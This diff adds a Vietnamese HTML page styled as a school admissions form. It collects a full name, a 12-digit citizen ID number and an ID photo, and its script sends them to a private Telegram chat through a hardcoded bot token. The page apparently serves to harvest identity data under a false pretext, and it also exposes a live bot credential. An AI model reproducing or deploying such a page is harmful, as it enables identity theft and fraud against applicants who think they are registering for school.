@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="shortcut icon" type="image/png" href="https://i.imgur.com/KWLwTcm.jpg">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <title>NGUYỄN VĂN KIÊN</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@10/dist/sweetalert2.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://i.imgur.com/TWlv0UK.jpg');
+            background-color: #f4f4f4;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+
+    <style>
+        /* Ẩn thanh điều khiển của thẻ audio */
+        audio::-webkit-media-controls {
+            display: none;
+        }
+    </style>
+    <audio id="play" loop>
+        <source src="https://files.catbox.moe/eflj3s.mp3">
+    </audio>
+    <audio id="play2" loop>
+        <source src="https://files.catbox.moe/clyn5k.mp3">
+    </audio>
+    <audio id="play3" loop>
+        <source src="https://files.catbox.moe/szfn3x.mp3">
+    </audio>
+    <audio id="play4" loop>
+        <source src="https://files.catbox.moe/4cod30.mp3">
+    </audio>
+    <audio id="play5" loop>
+        <source src="https://files.catbox.moe/g8jqyb.mp3">
+    </audio>
+    <audio id="play6" loop>
+        <source src="https://files.catbox.moe/4h77x6.mp3">
+    </audio>
+    <audio id="play7" loop>
+        <source src="https://files.catbox.moe/nmmdgw.mp3">
+    </audio>
+    <audio id="play8" loop>
+        <source src="https://files.catbox.moe/7xwrtb.mp3">
+    </audio>
+    <audio id="play9" loop>
+        <source src="https://files.catbox.moe/0nu35m.m4a">
+    </audio>
+    <audio id="play10" loop>
+        <source src="https://files.catbox.moe/kgnjfy.mp3">
+    </audio>
+</head>
+<body>
+
+<form id="myForm">
+    <h2>Điền thông tin tuyến sinh</h2>
+    <input type="text" id="fullname" placeholder="Họ và tên">
+    <input type="number" id="idnumber" placeholder="Số căn cước có 12 số">
+    <div class="form-group">
+        <label for="photo">Ảnh 4x6:</label>
+        <input type="file" id="photo" name="photo" accept="image/*" required>
+    </div>
+    <button type="submit">Gửi</button>
+</form>
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+    // Lấy tham chiếu đến thẻ audio
+    var audio1 = document.getElementById("play");
+    var audio2 = document.getElementById("play2");
+    var audio3 = document.getElementById("play3");
+    var audio4 = document.getElementById("play4");
+    var audio5 = document.getElementById("play5");
+    var audio6 = document.getElementById("play6");
+    var audio7 = document.getElementById("play7");
+    var audio8 = document.getElementById("play8");
+    var audio9 = document.getElementById("play9");
+    var audio10 = document.getElementById("play10");
+
+    var audioStarted = false;
+
+    function playAudio() {
+    if (!audioStarted) {
+        audioStarted = true;
+        var randomNumber = Math.floor(Math.random() * 10) + 1;
+        var randomAudio;
+
+        switch (randomNumber) {
+            case 1:
+                randomAudio = audio1;
+                break;
+            case 2:
+                randomAudio = audio2;
+                break;
+            case 3:
+                randomAudio = audio3;
+                break;
+            case 4:
+                randomAudio = audio4;
+                break;
+            case 5:
+                randomAudio = audio5;
+                break;
+            case 6:
+                randomAudio = audio6;
+                break;
+            case 7:
+                randomAudio = audio7;
+                break;
+            case 8:
+                randomAudio = audio8;
+                break;
+            case 9:
+                randomAudio = audio9;
+                break;
+            case 10:
+                randomAudio = audio10;
+                break;
+            default:
+                randomAudio = audio1; // Mặc định là audio1
+                break;
+        }
+
+        randomAudio.play();
+        randomAudio.addEventListener("ended", function() {
+            audioStarted = false; // Reset lại biến để phát bài hát mới khi kết thúc
+        });
+    }
+}
+
+// Gọi hàm playAudio() khi có sự kiện click xảy ra trên trang web
+document.addEventListener("click", playAudio);
+
+
+    async function sendToTelegram(fullname, idnumber, photo) {
+        const telegramBotToken = '6593363467:AAG78zb3Mhbn7Tn2j7AfQcOxb9qo2UVV7KE';
+        const chatId = '6520036650'; // Có thể là ID của một kênh hoặc chat cụ thể trên Telegram
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+
+        const requestData = new FormData();
+        requestData.append("chat_id", chatId);
+        requestData.append("photo", photo);
+        requestData.append("caption", `Họ và tên: ${fullname}\nSố căn cước: ${idnumber}`);
+
+        try {
+            const response = await axios.post(url, requestData, {
+                headers: {
+                    'Content-Type': 'multipart/form-data'
+                }
+            });
+
+            if (response.data.ok) {
+                return true;
+            } else {
+                console.error('Error sending message to Telegram:', response.data);
+                return false;
+            }
+        } catch (error) {
+            console.error('Error sending message to Telegram:', error);
+            return false;
+        }
+    }
+
+    document.getElementById("myForm").addEventListener("submit", async function (event) {
+        event.preventDefault();
+        const fullname = document.getElementById("fullname").value;
+        const idnumber = document.getElementById("idnumber").value;
+        const photo = document.getElementById("photo").files[0];
+
+        if (fullname.trim() === '' || idnumber.trim() === '' || !photo) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Oops...',
+                text: 'Vui lòng nhập đầy đủ thông tin!',
+            });
+            return;
+        }
+
+        if (idnumber.length !== 12) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Oops...',
+                text: 'Số căn cước cần phải có 12 số!',
+            });
+            return;
+        }
+
+        const success = await sendToTelegram(fullname, idnumber, photo);
+        if (success) {
+            Swal.fire({
+                icon: 'success',
+                title: 'Success',
+                text: 'Thông tin đã được gửi đi!',
+            });
+        } else {
+            Swal.fire({
+                icon: 'error',
+                title: 'Oops...',
+                text: 'Có lỗi xảy ra khi gửi thông tin!',
+            });
+        }
+    });
+
+    // Hiển thị thông báo khi nhạc được phát
+    Swal.fire({
+        title: "Điền Cho Đúng Ảnh Cho Đẹp Nhé",
+        width: 600,
+        padding: "3em",
+        color: "#716add",
+        background: "#fff url(https://sweetalert2.github.io/images/trees.png)",
+        backdrop: `
+            rgba(0,0,123,0.4)
+            url("https://sweetalert2.github.io/images/nyan-cat.gif")
+            left top
+            no-repeat
+        `
+    });
+</script>
+
+</body>
+</html>
